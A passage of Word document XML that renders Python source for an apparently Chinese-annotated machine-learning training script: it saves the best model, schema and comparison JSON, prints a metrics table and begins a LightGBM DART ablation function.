        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        "selected_by": (</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7AACA45D">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">            f"forward-chaining cv mean macro_f1_reliable (剔除样本数 &lt; {RARE_CLASS_SUPPORT} 的类)"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5188CA30">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">            if folds is not None</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="43D7A183">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">            else f"val macro_f1_reliable (剔除样本数 &lt; {RARE_CLASS_SUPPORT} 的类)"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="35DCBE08">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        ),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="46E19870">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        "metrics": results[best_name],</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="32518473">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        "trained_at": datetime.now(timezone.utc).isoformat(timespec="seconds"),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="24CCCFAF">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    }</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2D8BA261">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    joblib.dump(artifact, out_dir / "best_model.pkl")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="290D0AE2">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="50A9CD70">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    schema = {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3CF2D48B">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        "feature_names": feature_names,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6284A0C2">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        "classes": classes,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4DD254E2">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        "predict_returns": "class_index",</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="696EA3DE">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        "label_map": LABEL_MAP,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2A3C9E88">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        "scaler": {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="546B17A4">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">            "mean": scaler.mean_.tolist(),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5DA6A1BB">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">            "scale": scaler.scale_.tolist(),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="32DEA4C6">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">            "var": scaler.var_.tolist(),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="222B8FFA">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        },</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="24130856">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        "n_features": len(feature_names),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="69156769">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    }</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1F0F5F84">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    (out_dir / "feature_schema.json").write_text(</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5BEBF023">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        json.dumps(schema, ensure_ascii=False, indent=2), encoding="utf-8"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6470FC61">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    )</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="62B3E954">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    (out_dir / "comparison.json").write_text(</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5744113D">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        json.dumps(</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="451F5FB6">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">            {"best": best_name, "models": results, "split": {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="337BCE86">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">                "mode": args.split,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="418E5566">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">                "train": int(len(X_train)), "val": int(len(X_val)), "test": int(len(X_test)),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5EB84A2E">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">                "cv_folds": None if folds is None else [</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="25A8D2E7">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">                    {"train": int(len(tr)), "val": int(len(va))} for tr, va in folds</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2A9DEFCF">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">                ],</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="228FAE07">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">            }},</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="307F4874">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">            ensure_ascii=False,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="55D0AFDD">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">            indent=2,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="20AE5358">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        ),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7D9757BC">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        encoding="utf-8",</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="51CC829A">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    )</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="52124734">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="7BB9C569">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    print("\n| 模型 | 树数 | 训练(s) | test 可信macro-F1 | test macro-F1(含稀有类) | test 加权F1 | 准确率 |")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6E7C410B">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    print("|---|---|---|---|---|---|---|")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="73814BA3">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    for name, row in results.items():</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1AEC9287">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        tm = row["test"]</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="595C42C7">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        print(</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="04198CBD">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">            f"| {name} | {row['tree_count']} | {row['fit_seconds']} | "</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5B494FA0">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">            f"{tm['macro_f1_reliable']:.4f} | {tm['macro_f1']:.4f} | "</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5117DD2B">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">            f"{tm['weighted_f1']:.4f} | {tm['accuracy']:.4f} |"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4C65CD8B">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        )</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="61C2FE45">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    print(f"\n产物已写入 {out_dir}/")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="564B97CA">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    return 0</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="482124A8">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="14C08691">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="3A9379DA">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>def run_dart_ablation(cfg, X_train, y_train, X_test, y_test, classes, seed, out_dir):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="010C100C">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    """DART 消融：固定 LightGBM 为唯一基学习器，只改 boosting_type 一处变量。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4343716D">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="44B90912">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    CatBoost 没有 DART 实现，不能当消融载体；把消融塞进混合森林会同时改变</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0621343B">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
